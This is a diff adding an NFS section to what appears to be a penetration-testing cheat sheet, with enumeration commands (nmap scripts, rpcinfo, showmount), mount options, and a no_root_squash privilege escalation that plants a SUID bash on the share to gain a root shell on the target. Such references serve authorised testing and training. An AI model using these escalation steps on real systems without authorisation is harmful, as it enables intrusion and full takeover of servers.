@@ -29,3 +29,57 @@ Faster initial port discovery than nmap: pipe results straight into nmap for ser
 ```bash wrap
 rustscan -a <IP> -- -sV -sC
 ```
+
+## NFS
+
+NFS runs on port 2049, with portmapper/rpcbind on 111 handling service registration. Enumerate exports first, then mount.
+
+### Enumeration
+
+```bash wrap
+# nmap NFS scripts
+nmap -sV -p 111,2049 $TARGET
+nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 $TARGET
+
+# rpcinfo: list all RPC services registered on the host
+rpcinfo -p $TARGET
+
+# showmount: list exported shares and which hosts can access them
+showmount -e $TARGET
+```
+
+### Mounting
+
+```bash wrap
+# Mount an export
+mkdir /mnt/nfs
+mount -t nfs $TARGET:/share /mnt/nfs
+
+# Force NFSv3 if v4 causes issues
+mount -t nfs $TARGET:/share /mnt/nfs -o vers=3,nolock
+
+# Mount as read-only to avoid touching the share
+mount -t nfs $TARGET:/share /mnt/nfs -o ro
+
+# Unmount
+umount /mnt/nfs
+```
+
+### no_root_squash Abuse
+
+By default NFS maps root (UID 0) from the client to an anonymous user on the server (`root_squash`). If the export is configured with `no_root_squash`, root on your attacker machine is root on the server's share.
+
+```bash wrap
+# Check /etc/exports on the target for misconfigured exports
+cat /etc/exports
+# Vulnerable line looks like:
+# /share  *(rw,no_root_squash)
+
+# With no_root_squash: plant a SUID bash on the share as root
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash
+
+# On the target: execute the planted binary
+/share/bash -p
+# -p preserves the effective UID (SUID), gives root shell
+```
